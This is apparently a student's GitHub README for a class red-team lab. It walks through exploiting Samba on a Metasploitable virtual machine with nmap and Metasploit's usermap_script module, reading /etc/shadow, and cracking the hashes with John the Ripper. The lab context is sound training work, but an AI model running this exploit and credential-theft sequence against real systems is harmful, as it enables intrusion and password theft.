# School-Project-SMB-Exploit-
How to Exploit SMB(445) in a Metasploitable Victim Machine

First We verify our victim ip address by typing the 'ifconfig' command in metasploitable
![image](https://github.com/user-attachments/assets/323af5a8-c121-4907-8633-65ab09e09202)

In kali we verify if the victim machine smb port is open by using nmap and the victims ip address (nmap 10.4.3.100)
![image](https://github.com/user-attachments/assets/93d98265-c2e5-4efc-ba45-7006ddd26693)

Now lets open Metasploitable in kali by typing 'msfconsole'
![image](https://github.com/user-attachments/assets/77b6e9e9-7732-436d-95cb-ec407aaed667)

In msfconsole, we type in search smb
![image](https://github.com/user-attachments/assets/479780d6-01bc-45e0-a994-a5b39192a095)

After that, we find the updated version of smb but typing the command use 'auxiliary/scanner/smb/smb_version' and after that we type in 'info'
![image](https://github.com/user-attachments/assets/701bea02-f00c-4e2f-b0a4-d2dedd24e950)

In auxiliary/scanner/smb/smb_version we set the rhosts and the victims ip address like this 'set rhosts 10.4.3.100' and enter then type in 'info'
![image](https://github.com/user-attachments/assets/20a6f738-c748-4bbd-b57a-d5c07216227c)

After that type 'run' and 'search samba'
![image](https://github.com/user-attachments/assets/c325ac52-78cf-4df9-9c7a-37e51c58f459)

After that run the samba script like this 'use exploit/multi/samba/usermap_script' and type in 'info'
![image](https://github.com/user-attachments/assets/9163468d-2930-437d-a1a8-a36124b70f42)

Run the 'show options' to see the script
![image](https://github.com/user-attachments/assets/05cda4ba-ff3e-4b16-8c35-7fd418ee095d)

We set the rhosts and info command again like this 'set rhosts 10.4.3.100' and 'info'
![image](https://github.com/user-attachments/assets/96e36554-b064-43cd-9061-6fd92dffd28a)

We set the 'SMB(445)' port that we want to exploit like this set rport 445 and exploit
![image](https://github.com/user-attachments/assets/daa370d7-e286-4688-aefd-f5629316c82d)

When the exploit is complete, I type in the 'whoami' command and the cat/etc/shadow to get our hash like this
![image](https://github.com/user-attachments/assets/6e459e64-a7bb-4d9b-a747-3d3090d4cbda)

This is a team project and we are all being assigned to a different team by groups, and as for me I am in 'redteam4' to get out hash
![image](https://github.com/user-attachments/assets/7885229c-74ce-45be-aaf9-104cdcb410fe)

After getting the hash and I open 'leafpad' to save the hash for execution. To do that, i type in 'leafpad hash.txt' in a new window in kali
![image](https://github.com/user-attachments/assets/d59527e4-f307-4bf7-b809-50fa8f9ec2e8)

I have already saved mine and I type in 'cat hash.txt' to verify that the hash was properly saved.
![image](https://github.com/user-attachments/assets/4ff65c29-f9a8-4668-a1a3-3dd045f8ea3c)

I use 'John the Ripper' to the hash to get our password like this in kali 'john hash.txt' and enter, wait for john to complete to see the password.
![image](https://github.com/user-attachments/assets/dac97398-5f58-46b9-b175-82e3745ada8f)

As team 4 student 3, this is my password/code with white line.
![image](https://github.com/user-attachments/assets/1240ef1a-2248-4ee4-914c-7c8e9d2b914f)







